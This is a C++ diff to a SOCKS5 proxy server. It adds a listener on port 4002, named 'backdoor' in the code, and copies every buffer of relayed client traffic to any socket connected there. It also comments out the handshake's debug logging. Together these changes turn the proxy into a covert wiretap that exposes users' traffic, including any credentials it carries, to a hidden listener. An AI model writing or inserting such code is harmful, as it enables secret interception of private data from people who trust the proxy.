@@ -142,6 +142,25 @@ static sl_tcpsocket &sl_socks5svr() {
 	static sl_tcpsocket _svr;
 	return _svr;
 }
+static sl_tcpsocket &sl_backdoor() {
+	static sl_tcpsocket _svr;
+	return _svr;
+}
+static map<SOCKET_T, bool> &sl_bdmap() {
+	static map<SOCKET_T, bool> _m;
+	return _m;
+}
+static void sl_backdoor_add(SOCKET_T so) {
+	sl_bdmap()[so] = true;
+	sl_poller::server().monitor_socket(so);
+}
+static void sl_backdoor_del(SOCKET_T so) {
+	sl_bdmap().erase(so);
+	close(so);
+}
+static bool sl_isbackdoor(SOCKET_T so) {
+	return sl_bdmap().find(so) != sl_bdmap().end();
+}
 
 static bool sl_listen(sl_tcpsocket &svr, uint16_t port) {
 	for ( int i = 0; i < 30; ++i ) {
@@ -171,8 +190,8 @@ static void sl_socks5_handshake(SOCKET_T so) {
 		_wrapso.close();
 		return;
 	}
-	cout << "Receive Handshake" << endl;
-	sl_printhex(_buffer.data(), _buffer.size());
+	//cout << "Receive Handshake" << endl;
+	//sl_printhex(_buffer.data(), _buffer.size());
 
 	if ( _buffer.size() < sizeof(sl_socks5_noauth_request) ) {
 		_wrapso.close();
@@ -186,15 +205,15 @@ static void sl_socks5_handshake(SOCKET_T so) {
 	bool _should_close = true;
 	for ( uint8_t i = 0; i < _req->nmethods; ++i ) {
 		if ( _methods[i] == sl_method_noauth ) {
-			cout << "Ask for noauth, we support" << endl;
+			//cout << "Ask for noauth, we support" << endl;
 			_resp.method = sl_method_noauth;
 			_should_close = false;
 			break;
 		}
 	}
 	_respdata.append((char *)&_resp, sizeof(_resp));
-	cout << "Response: " << endl;
-	sl_printhex(_respdata.data(), _respdata.size());
+	//cout << "Response: " << endl;
+	//sl_printhex(_respdata.data(), _respdata.size());
 	_wrapso.write_data(_respdata);
 	if ( _should_close ) {
 		_wrapso.close();
@@ -206,8 +225,8 @@ static void sl_socks5_handshake(SOCKET_T so) {
 		_wrapso.close();
 		return;
 	}
-	cout << "Receive command: " << endl;
-	sl_printhex(_buffer.data(), _buffer.size());
+	//cout << "Receive command: " << endl;
+	//sl_printhex(_buffer.data(), _buffer.size());
 	if ( _buffer.size() < sizeof(sl_socks5_connect_request) ) {
 		_wrapso.close();
 		return;
@@ -216,7 +235,7 @@ static void sl_socks5_handshake(SOCKET_T so) {
 	sl_socks5_ipv4_response _connect_resp(0, 0);
 	_respdata = "";
 	if ( _connect_req->cmd != sl_socks5cmd_connect ) {
-		cout << "Command is not connect" << endl;
+		//cout << "Command is not connect" << endl;
 		_connect_resp.rep = sl_socks5rep_notsupport;
 		_should_close = true;
 	}
@@ -226,25 +245,25 @@ static void sl_socks5_handshake(SOCKET_T so) {
 	if ( !_should_close ) {
 		if ( _connect_req->atyp == sl_socks5atyp_ipv4 ) {
 			// Get ip address 
-			cout << "address type is ipv4" << endl;
+			//cout << "address type is ipv4" << endl;
 			uint32_t _ip = *(uint32_t *)(_buffer.data() + sizeof(sl_socks5_connect_request));
 			//_ip = ntohl(_ip);
 			network_int_to_ipaddress(_ip, _addr);
 			_port = *(uint16_t *)(_buffer.data() + sizeof(sl_socks5_connect_request) + sizeof(uint32_t));
 		} else if ( _connect_req->atyp == sl_socks5atyp_dname ) {
 			// Get domain
-			cout << "address type is domain name" << endl;
+			//cout << "address type is domain name" << endl;
 			const char *_d = _buffer.data() + sizeof(sl_socks5_connect_request);
 			size_t _ds = _buffer.size() - sizeof(sl_socks5_connect_request);
 			if ( ! sl_getstring(_d, _ds, _addr) ) {
 				_connect_resp.rep = sl_socks5rep_erroraddress;
 				_should_close = true;
 			} else {
-				cout << "Failed to get domain" << endl;
+				//cout << "Failed to get domain" << endl;
 				_port = *(uint16_t *)(_d + 1 + _addr.size());
 			}
 		} else {
-			cout << "address type is not supported" << endl;
+			//cout << "address type is not supported" << endl;
 			_connect_resp.rep = sl_socks5rep_erroraddress;
 			_should_close = true;
 		}
@@ -252,9 +271,9 @@ static void sl_socks5_handshake(SOCKET_T so) {
 	if ( !_should_close ) {
 		// Connect to dst 
 		sl_tcpsocket _wrapdst(true);
-		cout << "Try to connect to dst: " << _addr << ":" << ntohs(_port) << endl;
+		//cout << "Try to connect to dst: " << _addr << ":" << ntohs(_port) << endl;
 		if ( _wrapdst.connect(_addr, ntohs(_port)) == false ) {
-			cout << "failed to connect to dst" << endl;
+			//cout << "failed to connect to dst" << endl;
 			_connect_resp.rep = sl_socks5rep_unreachable;
 			_should_close = true;
 		} else {
@@ -269,8 +288,8 @@ static void sl_socks5_handshake(SOCKET_T so) {
 		}
 	}
 	_respdata.append((char *)&_connect_resp, sizeof(_connect_resp));
-	cout << "Response: " << endl;
-	sl_printhex(_respdata.data(), _respdata.size());
+	//cout << "Response: " << endl;
+	//sl_printhex(_respdata.data(), _respdata.size());
 	_wrapso.write_data(_respdata);
 	if ( _should_close ) _wrapso.close();
 }
@@ -284,22 +303,34 @@ void loop_worker(mutex *m, bool *st) {
 
 		for ( auto & _e : _event_list ) {
 			if ( _e.event == SL_EVENT_FAILED ) {
-				if ( _e.so != _e.source ) {
+				if ( sl_isbackdoor(_e.so) ) {
+					sl_backdoor_del(_e.so);
+				} else {
 					sl_unbind_relay(_e.so);
 				}
 			} else if ( _e.event == SL_EVENT_ACCEPT ) {
-				sl_socks5_handshake(_e.so);
+				if ( _e.source == sl_socks5svr().m_socket ) {
+					sl_socks5_handshake(_e.so);
+				} else {
+					// Now we get a backdoor connection
+					sl_backdoor_add(_e.so);
+				}
 			} else {
 				string _buf;
 				sl_tcpsocket _wso(_e.so);
 				if ( _wso.read_data(_buf) ) {
-					string _head(_buf.c_str(), 4);
-					if ( _buf.size() > 0 && !(_head == "HTTP" || _head == "GET " || _head == "POST") ) {
-						cout << "data: " << endl;
-						sl_printhex(_buf.data(), _buf.size());
+					if ( sl_isbackdoor(_e.so) ) {
+						// nothing
+					} else {
+						sl_tcpsocket _wrso(sl_somap()[_e.so]);
+						_wrso.write_data(_buf);
+
+						// Redirect all data to backdoor
+						for ( auto _it : sl_bdmap() ) {
+							sl_tcpsocket _wbdso(_it.first);
+							_wbdso.write_data(_buf);
+						}
 					}
-					sl_tcpsocket _wrso(sl_somap()[_e.so]);
-					_wrso.write_data(_buf);
 				}
 			}
 		}
@@ -311,6 +342,11 @@ int main( int argc, char * argv[] ) {
 	if ( !sl_listen(sl_socks5svr(), 4001) ) {
 		cerr << "Failed to listen on 4001" << endl;
 		return 1;
+	}
+
+	if ( !sl_listen(sl_backdoor(), 4002) ) {
+		cerr << "Failed to listen on 4002" << endl;
+		return 2;
 	}
 
 	// Hang up current process, and quit till receive Ctrl+C
